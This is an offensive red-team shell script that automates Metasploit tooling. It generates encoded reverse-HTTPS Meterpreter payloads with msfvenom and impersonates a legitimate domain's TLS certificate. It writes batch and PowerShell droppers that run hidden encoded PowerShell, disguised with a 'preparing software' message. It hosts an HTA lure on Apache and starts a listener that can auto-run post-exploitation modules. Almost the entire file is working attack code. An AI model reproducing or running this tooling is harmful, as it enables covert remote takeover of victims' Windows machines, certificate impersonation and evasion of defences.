#!/bin/sh
##
# Meterpreter Paranoid Mode - SSL/TLS connections
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.4
# Distros Supported : Linux Kali, Mint, Ubuntu
# Suspicious-Shell-Activity (SSA) RedTeam dev @2017
# ---
#
# DESCRIPTION:
# In some scenarios, it pays to be paranoid. This also applies to generating
# and handling Meterpreter sessions. This script implements the Meterpreter
# paranoid mode (SSL/TLS) payload build, by creating a SSL/TLS Certificate
# (manual OR impersonate) to use it in connection (server <-> client) ..
# "The SHA1 hash its used to validate the connetion betuiwn handler/payload"
# ---
#
# SPECIAL THANKS (POCs):
# hdmoore | oj | darkoperator
# http://buffered.io/posts/staged-vs-stageless-handlers/
# https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode
# https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation
##
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 39 80 > /dev/null
##




#
# Tool variable declarations _______________
#                                           |
V3R="1.4"                                   # Tool version release
IPATH=`pwd`                                 # Store tool full install path
SeRvi="service postgresql"                  # Command used to start postgresql
ApAcHe="/var/www/html"                      # Apache2 webroot (hta attack vector)
# __________________________________________|
#
# Read options (configurations) from settings file ..
#
ENCODE=`cat $IPATH/settings | egrep -m 1 "MSF_ENCODER" | cut -d '=' -f2` > /dev/null 2>&1 # Msf encoder to use to encode payload
ChEk_DB=`cat $IPATH/settings | egrep -m 1 "REBUILD_MSFDB" | cut -d '=' -f2` > /dev/null 2>&1 # Rebuild msfdb database?
DEFAULT_EXT=`cat $IPATH/settings | egrep -m 1 "PAYLOAD_EXTENSION" | cut -d '=' -f2` > /dev/null 2>&1 # Payload extension(bat|ps1|txt)
ENCODE_NUMB=`cat $IPATH/settings | egrep -m 1 "ENCODER_INTERACTIONS" | cut -d '=' -f2` > /dev/null 2>&1 # Interactions to encode (0|9)
ExEc=`cat $IPATH/settings | egrep -m 1 "RUN_POST_EXPLOTATION" | cut -d '=' -f2` > /dev/null 2>&1 # Run post-exploitation at session popup?
PoSt=`cat $IPATH/settings | egrep -m 1 "POST_MODULE" | cut -d '=' -f2` > /dev/null 2>&1 # Msf command to run at session popup?
VaL=`cat $IPATH/settings | egrep -m 1 "ENABLE_UNICODE_ENCODING" | cut -d '=' -f2` > /dev/null 2>&1 # enable unicode encoding?
StAgE=`cat $IPATH/settings | egrep -m 1 "ENABLE_STAGE_ENCODING" | cut -d '=' -f2` > /dev/null 2>&1 # enable stage encoding?
HtA=`cat $IPATH/settings | egrep -m 1 "HTA_ATTACK_VECTOR" | cut -d '=' -f2` > /dev/null 2>&1 # Use hta attack vector to deliver agent?



#
# check if user is root
#
if [ $(id -u) != "0" ]; then
echo "[☠] we need to be root to run this script..."
echo "[☠] execute [ sudo ./Meterpreter_Paranoid_Mode.sh ] on terminal"
exit
fi



#
# Pass arguments to script [ ./Meterpreter_Paranoid_Mode.sh -h ]
#
while getopts ":h" opt; do
  case $opt in
    h)
cat << !
---
-- Author: r00t-3xp10it | SSA RedTeam @2017
-- Special-Thanks: HD-moore, OJ, DarkOperator
-- Supported: Linux Kali, Ubuntu, Mint, Parrot OS
-- Suspicious-Shell-Activity (SSA) RedTeam develop @2017
---

 Meterpreter_Paranoid_Mode.sh allows users to secure your staged/stageless
 connection for Meterpreter by having it check the certificate of the
 handler it is connecting to.

 We start by generating a certificate in PEM format, once the certs have
 been created we can create a HTTP or HTTPS or EXE payload for it and give
 it the path of PEM format certificate to be used to validate the connection.

 To have the connection validated we need to tell the payload what certificate
 the handler will be using by setting the path to the PEM certificate in the
 HANDLERSSLCERT option then we enable the checking of this certificate by
 setting stagerverifysslcert to true.

 Once that payload is created we need to create a handler to receive the
 connection and again we use the PEM certificate so the handler can use the
 SHA1 hash for validation. Just like with the Payload we set the parameters
 HANDLERSSLCERT with the path to the PEM file and stagerverifysslcert to true. 


When we get payload execution, we can see the stage doing the validation
[*] 192.168.1.67:666 (UUID: db09ad1/x86=1/windows=1/2017-05-13 Staging payload
[*] Meterpreter will verify SSL Certificate with SHA1 hash 5fefcc6cae205d8c884
[*] Meterpreter session 1 opened (192.168.1.69:8081 -> 192.168.1.67:666)

!
   exit
    ;;
    \?)
      echo " Invalid option: -$OPTARG "
      exit
    ;;
  esac
done



#
# Colorise shell Script output leters
#
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



#
# Check tool dependencies ..
#
Colors;
npm=`which msfconsole`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} msfconsole '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires metasploit to work! ${Reset};
exit
fi



#
# rebuild msfdb? (postgresql) 
# 
if [ "$ChEk_DB" = "ON" ]; then
  #
  # start msfconsole to check postgresql connection status
  #
  echo ${BlueF}[☆]${white}" Starting postgresql service .."${Reset};
  $SeRvi start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  echo ${BlueF}[☆]${white}" Checking msfdb connection status .."${Reset};
  # Store db_status core command into one variable
  ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
    if [ "$ih" != "connected" ]; then
      echo ${RedF}[x]${white}" postgresql selected, no connection .."${Reset};
      echo ${BlueF}[☆]${white}" Please wait, rebuilding msf database .."${Reset};
      # rebuild msf database (database.yml)
      msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
      echo ${GreenF}[✔]${white}" postgresql connected to msf .."${Reset};
      sleep 3
    else
      echo ${GreenF}[✔]${white}" postgresql connected to msf .."${Reset};
      sleep 3
    fi
fi



#
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
#
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Linux) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;; # Mint strange bug
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear



#
# Tool main menu banner ..
# we can abort (ctrl+c) tool execution at this point ..
#
cat << !

    ███╗   ███╗██████╗███╗   ███╗ 
    ████╗ ████║██╗ ██║████╗ ████║ 
    ██╔████╔██║██████║██╔████╔██║
    ██║╚██╔╝██║██╔═══╝██║╚██╔╝██║ 
    ██║ ╚═╝ ██║██║    ██║ ╚═╝ ██║
    ╚═╝     ╚═╝╚═╝    ╚═╝     ╚═╝Author::r00t-3xp10it
!
echo ${white}"    MPM©${RedF}::${white}v$V3R${RedF}::${white}Suspicious_Shell_Activity©${RedF}::${white}Red_Team${RedF}::${white}2017"${Reset};
echo "${BlueF}    ╔───────────────────────────────────────────────────────╗"
echo "${BlueF}    |${YellowF}    Meterpreter Paranoid Mode (SSL/TLS) connections    ${BlueF}|"
echo "${BlueF}    ╠───────────────────────────────────────────────────────╣"
echo "${BlueF}    |${white} This tool allow users to secure your staged/stageless ${BlueF}|"
echo "${BlueF}    |${white} connections http(s) for meterpreter by having it check${BlueF}|"
echo "${BlueF}    |${white}  the certificate of the handler it is connecting to.  ${BlueF}|"
echo "${BlueF}    ╠───────────────────────────────────────────────────────╝"
sleep 1
echo "${BlueF}    ╘ ${white}Press [${YellowF} ENTER ${white}] to continue${RedF}!${Reset}"
echo ""
read OP



#
# Build PEM certificate (manual or impersonate)
#
cHos=$(zenity --list --title "☠ CERTIFICATE BUILD ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "manual certificate" FALSE "impersonate domain" --width 300 --height 180) > /dev/null 2>&1
if [ "$cHos" = "manual certificate" ]; then
  #
  # SSA TEAM CERTIFICATE or your OWN (manual creation)
  #
  echo ${BlueF}[☠]${white} Input pem settings ..${Reset};
  CoNtRy=$(zenity --title="☠ Enter  CONTRY CODE ☠" --text "example: US" --entry --width 270) > /dev/null 2>&1
  StAtE=$(zenity --title="☠ Enter  STATE CODE ☠" --text "example: Texas" --entry --width 270) > /dev/null 2>&1
  CiTy=$(zenity --title="☠ Enter  CITY NAME ☠" --text "example: Austin" --entry --width 270) > /dev/null 2>&1
  OrGa=$(zenity --title="☠ Enter  ORGANISATION ☠" --text "example: Development" --entry --width 270) > /dev/null 2>&1
  N4M3=$(zenity --title="☠ Enter  DOMAIN NAME (CN) ☠" --text "example: ssa-team.com" --entry --width 270) > /dev/null 2>&1
  cd $IPATH/output
  echo ${BlueF}[☠]${white} Building certificate ..${BlueF};
  openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=$CoNtRy/ST=$StAtE/L=$CiTy/O=$OrGa/CN=$N4M3" -keyout $N4M3.key -out $N4M3.crt && cat $N4M3.key $N4M3.crt > $N4M3.pem && rm -f $N4M3.key $N4M3.crt
    #
    # Check if certificate was build (shanty bug-report)..
    #
    if ! [ -f "$IPATH/output/$N4M3.pem" ]; then
      echo ${RedF}[x]${white}" Certificate: $N4M3.pem not found, aborting .."
      sleep 2
      exit
    fi
  echo ${BlueF}[☠]${white}" Stored: output/$N4M3.pem .."${BlueF};
  sleep 1


elif [ "$cHos" = "impersonate domain" ]; then
  #
  # Impersonate a legit domain (msf auxiliary module)
  # Copy files generated to proper location and cleanup ..
  #
  echo ${BlueF}[☠]${white} Input pem settings ..${Reset};
  N4M3=$(zenity --title="☠ Enter DOMAIN NAME (CN) ☠" --text "example: ssa-team.com" --entry --width 270) > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Impersonating certificate ..${BlueF};
  msfconsole -q -x "use auxiliary/gather/impersonate_ssl; set RHOST $N4M3; exploit; sleep 3; exit -y"
  echo "Impersonating $N4M3 RSA private key"
  sleep 1
  echo "................................................................................................................................................................................................................................................................................................................................................................................................................"
  sleep 1
  echo "Writing new private key to '$N4M3.key'"
  cd ~/.msf4/loot
  # Cleanup, copy/paste in output folder ..
  mv *.pem $IPATH/output/$N4M3.pem > /dev/null 2>&1
  rm *.key && rm *.crt && rm *.log > /dev/null 2>&1
    #
    # Check if certificate was build (shanty bug-report)..
    #
    if ! [ -f "$IPATH/output/$N4M3.pem" ]; then
      echo ${RedF}[x]${white}" Certificate: $N4M3.pem not found, aborting .."
      sleep 2
      exit
    fi
  echo ${BlueF}[☠]${white}" Stored: output/$N4M3.pem .."${BlueF};
  sleep 1
  cd $IPATH/output
  sleep 1

else
  #
  # Cancel button pressed, aborting script execution ..
  #
  echo ${RedF}[x]${white}" Cancel button, aborting .."
  if [ "$ChEk_DB" = "ON" ]; then
  $SeRvi stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  fi
  sleep 2
  exit
fi




#
# Chose to build a staged (payload.bat|ps1|txt) or a stageless (payload.exe) ..
#
BuIlD=$(zenity --list --title "☠ PAYLOAD CATEGORIES ☠" --text "\nChose payload categorie:" --radiolist --column "Pick" --column "Option" TRUE "staged (payload.$DEFAULT_EXT)" FALSE "stageless (payload.exe)" --width 300 --height 180) > /dev/null 2>&1
#
# Staged payload build (batch output)
# HINT: Edit settings file and change 'DEFAULT_EXTENSION=bat' to the extension required ..
#
if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
  echo ${BlueF}[☠]${white} staged payload sellected ..${Reset};
  sleep 1
    #
    # Create a Paranoid Payload (staged payload)
    # For this use case, we will combine Payload UUID tracking with TLS pinning.
    #
    echo ${BlueF}[☠]${white} Building staged payload.$DEFAULT_EXT ..${BlueF};
    LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
    LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
    paylo=$(zenity --list --title "☠ PAYLOADS AVAILABLE ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 250) > /dev/null 2>&1
     # Config correct payload arch selected ..
     if [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
       ArCh="x64"
     else
       ArCh="x86"
     fi
     # config correct format ..
     if [ "$DEFAULT_EXT" = "exe" ]; then
       format="exe"
     else
       format="psh-cmd"
     fi
    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f $format -o paranoid-staged.$DEFAULT_EXT

      #
      # head (shellcode) - paranoid-staged.bat
      #
      if [ "$DEFAULT_EXT" = "exe" ]; then
        echo "No template required" > /dev/null 2>&1
      else
        str0=`cat $IPATH/output/paranoid-staged.$DEFAULT_EXT | awk {'print $12'}`
        rm $IPATH/output/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
      fi
      echo ${BlueF}[☠]${white} Building template ..${Reset};
      sleep 2
        #
        # build template file ( bat | ps1 | txt)
        #
        if [ "$DEFAULT_EXT" = "bat" ]; then
          echo ":: template batch | Author: r00t-3xp10it" > $IPATH/output/template
          echo ":: ---" >> $IPATH/output/template
          echo "@echo off" >> $IPATH/output/template
          echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/template
          echo "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -Exec Bypass -noni -enc $str0" >> $IPATH/output/template
          echo "exit" >> $IPATH/output/template
          mv -f template paranoid-staged.$DEFAULT_EXT
          # no template required ..
        elif [ "$DEFAULT_EXT" = "exe" ]; then
          echo "No template required" > /dev/null 2>&1
        else
          # build template ( ps1 | txt )
          echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $str0" > $IPATH/output/template
          mv -f template paranoid-staged.$DEFAULT_EXT
        fi

    #
    # Use HTA attack vector to deliver the agent ..
    #
    if [ "$HtA" = "ON" ]; then
      echo ${BlueF}[☠]${white} HTA attack vector sellected ..${Reset};
      cd $IPATH/bin
      sleep 2
        #
        # Building HTA trigger file ..
        #
        if [ "$DEFAULT_EXT" = "bat" ] || [ "$DEFAULT_EXT" = "exe" ]; then
          # barra bug-fix bat execution using hta ..
          echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
          sleep 2
          sed "s|LhOsT|$LhOsT|" EasyFileSharing2.hta > trigger.hta
          sed -i "s|NaMe|paranoid-staged.$DEFAULT_EXT|g" trigger.hta
          mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
          cp $IPATH/output/paranoid-staged.$DEFAULT_EXT $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
        else
          echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
          sleep 2
          sed "s|LhOsT|$LhOsT|" EasyFileSharing.hta > trigger.hta
          sed -i "s|NaMe|paranoid-staged.$DEFAULT_EXT|" trigger.hta
          mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
          cp $IPATH/output/paranoid-staged.$DEFAULT_EXT $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
        fi
      #
      # Start apache2 service ..
      #
      /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
      # Present URL (attack vector) to user
      echo ${BlueF}"Attack vector: http://$LhOsT/EasyFileSharing.hta" ${Reset};
      sleep 2
      cd $IPATH
    fi

  # 
  # Create the staged Paranoid Listener (multi-handler)
  #
  # A staged payload would need to set the HandlerSSLCert and
  # StagerVerifySSLCert true options to enable TLS pinning:
  echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
  if [ "$ExEc" = "YES" ]; then
    # Run post-exploitation module 
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; set AutoRunScript $PoSt; exploit"
  else
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; exploit"
  fi
  #
  # Cleaning files & stop apache2 ..
  #
  rm $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
  rm $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
  /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  sleep 2




#
# Stageless payload build (exe output)
#
elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
  echo ${BlueF}[☠]${white} stageless payload sellected ..${Reset};
  sleep 1
    #
    # Chose payload to use Building a stageless agent ..
    #
    cd $IPATH/output
    echo ${BlueF}[☠]${white} Building stageless payload.exe ..${BlueF};
    LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
    LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
    paylo=$(zenity --list --title "☠ PAYLOADS AVAILABLE ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" --width 350 --height 220) > /dev/null 2>&1

     #
     # Config correct payload arch selected ..
     #
     if [ "$paylo" = "windows/x64/meterpreter_reverse_https" ]; then
       ArCh="x64"
     else
       ArCh="x86"
     fi
    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f exe -o paranoid-stageless.exe
    sleep 2

    #
    # Use HTA attack vector to deliver the agent ..
    #
    if [ "$HtA" = "ON" ]; then
      echo ${BlueF}[☠]${white} HTA attack vector sellected ..${Reset};
      cd $IPATH/bin
      sleep 2
        #
        # Building HTA trigger file ..
        #
        echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
        sleep 2
        sed "s|LhOsT|$LhOsT|" EasyFileSharing2.hta > trigger.hta
        sed -i "s|NaMe|paranoid-staged.exe|g" trigger.hta
        mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
        cp $IPATH/output/paranoid-staged.exe $ApAcHe/paranoid-staged.exe > /dev/null 2>&1
      #
      # Start apache2 service ..
      #
      /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
      # Present URL (attack vector) to user
      echo ${BlueF}"Attack vector: http://$LhOsT/EasyFileSharing.hta" ${Reset};
      sleep 2
      cd $IPATH
    fi


  #
  # Create a stageless Paranoid Listener (multi-handler)..
  #     
  # A stageless payload would need to set the HandlerSSLCert and
  # StagerVerifySSLCert true options to enable TLS pinning:
  echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
  if [ "$ExEc" = "YES" ]; then
    # Run post-exploitation module 
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; set AutoRunScript $PoSt; exploit"
  else
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; set EnableUnicodeEncoding $VaL; set EnableStageEncoding $StAgE; set StageEncoder $ENCODE; exploit"
  fi
  #
  # Cleaning files & stop apache2 ..
  #
  rm $ApAcHe/paranoid-staged.exe > /dev/null 2>&1
  rm $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
  /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  sleep 2


else
  #
  # Cancel button pressed, aborting script execution ..
  #
  echo ${RedF}[x]${white}" Cancel button, aborting .."
  if [ "$ChEk_DB" = "ON" ]; then
  $SeRvi stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  fi
  sleep 2
  exit
fi



#
# The End ..
#
echo ${BlueF}[☠]${white} Module execution finished ..${Reset};
if [ "$ChEk_DB" = "ON" ]; then
$SeRvi stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
sleep 1
exit
